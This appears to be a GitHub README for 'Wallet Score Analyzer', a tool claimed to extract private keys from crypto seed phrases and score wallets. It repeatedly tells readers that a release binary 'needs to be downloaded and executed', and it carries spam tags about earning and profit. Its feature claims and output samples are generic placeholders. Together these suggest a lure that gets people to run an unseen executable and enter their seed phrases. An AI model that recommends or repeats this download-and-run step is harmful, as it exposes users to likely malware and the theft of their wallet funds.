# Wallet Score Analyzer — Recover Keys from Seed Phrases Tool

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github&style=for-the-badge)](https://github.com/josezucchi32/Wallet-Score-Analyzer/releases)  
🧭 🔑 💼 📈

![Hero image - crypto wallet](https://images.unsplash.com/photo-1612831455548-2d8d6a6d4f03?auto=format&fit=crop&w=1400&q=80)

Table of contents
- What this does
- Key features
- Quick start
- Usage examples
- Recovery phrase and derivation basics
- Configuration
- CLI reference
- Troubleshooting and FAQs
- Releases
- Contribute
- License

What this does
--------------
Wallet Score Analyzer extracts a wallet private key from a BIP39 recovery phrase.  
It derives keys, computes simple wallet scores, and lists potential addresses to check.  
Use it to verify seed phrases, test derivation paths, and inspect address outputs.

Key features
------------
- Seed phrase (BIP39) input and validation. 🔐  
- Support for common derivation paths (BIP44, BIP49, BIP84). 🧭  
- Private key and address output for multiple chains (ETH, BTC). ⛓️  
- Simple wallet scoring based on balance checks, address activity, and known risks. 📊  
- Export keys and addresses to CSV or JSON. 📁  
- Minimal CLI and scripting-ready API. ⚙️

Quick start
-----------
Prerequisites
- Node 18+ or Python 3.9+ (repository includes both JS and Python helpers).  
- Git for cloning if you want the source.

Download and run release
- Go to releases and download the file. The release file needs to be downloaded and executed:  
  https://github.com/josezucchi32/Wallet-Score-Analyzer/releases

Or use the badge above to jump to the latest release. The release archive contains binaries and a README with install steps. Download the release file and execute it on a machine you control.

Install from source (Node)
```bash
git clone https://github.com/josezucchi32/Wallet-Score-Analyzer.git
cd Wallet-Score-Analyzer
npm install
npm run build
node dist/cli.js --help
```

Install from source (Python)
```bash
git clone https://github.com/josezucchi32/Wallet-Score-Analyzer.git
cd Wallet-Score-Analyzer/python
pip install -r requirements.txt
python cli.py --help
```

Usage examples
--------------
Basic seed phrase check (CLI)
```bash
# Node CLI
node dist/cli.js --seed "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about" --chain eth --count 5

# Python CLI
python cli.py --seed "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about" --chain btc --type p2wpkh --count 3
```

Output sample (JSON)
```json
{
  "seed": "abandon ... about",
  "chain": "eth",
  "derivation": "m/44'/60'/0'/0",
  "addresses": [
    {
      "index": 0,
      "address": "0x1234...abcd",
      "privateKey": "0x9876...fedc",
      "score": 12
    }
  ]
}
```

Export to CSV
```bash
node dist/cli.js --seed "..." --export csv --out wallet-list.csv
```

Recovery phrase and derivation basics
-----------------------------------
- BIP39 defines seed phrases. The phrase maps to a binary seed.  
- BIP32 defines hierarchical deterministic (HD) wallets. You derive child keys from a master seed.  
- BIP44 sets a standard path m / purpose' / coin_type' / account' / change / address_index.  
- BIP49 and BIP84 set alternate script types for BTC (P2SH-P2WPKH and P2WPKH).  
- The tool supports common paths and custom paths. Use --path to set a specific derivation path.

Scoring model (simple)
----------------------
Wallet Score Analyzer uses a small, transparent scoring model:
- Address activity (incoming/outgoing tx): weight 5.  
- Known contracts or risky tags: weight -4.  
- Balance level (on-chain): scaled 0–10.  
- Age of first transaction: weight 2.  
- Combined score yields a simple metric 0–20. Scores help prioritize checks and audits.

Configuration
-------------
Config file (config.json)
```json
{
  "defaultChain": "eth",
  "derivationPaths": [
    "m/44'/60'/0'/0",
    "m/44'/0'/0'/0",
    "m/84'/0'/0'/0"
  ],
  "scanCount": 20,
  "apiProviders": {
    "eth": "https://api.etherscan.io/api",
    "btc": "https://api.blockcypher.com/v1/btc/main"
  }
}
```
- You can override config by CLI flags or environment variables.  
- Set API keys in env variables for provider access (e.g., ETHERSCAN_API_KEY). The tool uses providers to fetch balance and tx info.

CLI reference
-------------
Common options
- --seed "<mnemonic phrase>" : supply the BIP39 recovery phrase.  
- --chain <eth|btc> : choose chain. Default: eth.  
- --count <n> : number of addresses to derive per path.  
- --path "<derivation>" : custom derivation path.  
- --export <json|csv> : export results.  
- --out <file> : output file for exports.  
- --verbose : show detailed steps.

Examples
- Derive first 10 ETH addresses from standard path:
  node dist/cli.js --seed "<mnemonic>" --chain eth --path "m/44'/60'/0'/0" --count 10
- Test multiple paths in one run:
  node dist/cli.js --seed "<mnemonic>" --chain eth --count 5 --paths "m/44'/60'/0'/0,m/44'/60'/0'/1"

Troubleshooting and FAQs
------------------------
Q: The CLI fails to run after download.  
A: Ensure you downloaded the right binary for your platform and set execute permissions. For Unix:
```bash
chmod +x ./wallet-score-analyzer
./wallet-score-analyzer --help
```

Q: The tool shows zero balances for known accounts.  
A: Check your API provider keys and network selection. Use the --chain flag to target the right chain.

Q: I need a custom derivation path.  
A: Use --path with the full path. The tool accepts hardened markers (').

Releases
--------
Visit releases and download the file. The release file needs to be downloaded and executed:  
https://github.com/josezucchi32/Wallet-Score-Analyzer/releases

[![Download Release](https://img.shields.io/badge/Release-Download_now-green?logo=github&style=for-the-badge)](https://github.com/josezucchi32/Wallet-Score-Analyzer/releases)

Each release bundle contains:
- Cross-platform binaries for common OSes.  
- Source tarball.  
- Changelog and checksums.  
Download the binary that matches your OS. Run the binary from a terminal. If you prefer source, follow the build steps in Quick start.

Contribute
----------
- Fork the repo.  
- Create a branch for your change.  
- Open a PR with a clear description and tests.  
Focus areas where help matters:
- Add chain support (e.g., BSC, MATIC).  
- Improve scoring heuristics.  
- Add integrations with more block explorers.

Project topics (tags)
---------------------
arbitrage, auto, cash, code, crypto, earning, free, gain, income, learn, profit, smart, trade, tutorial, youtube

Security and handling keys
--------------------------
Store any exported keys in secure storage. The tool can export to file or stdout. Use file permissions to limit access. Use hardware wallets to manage real funds. The tool helps audit and test. Keep your master phrases private.

License
-------
MIT License. See LICENSE file for details.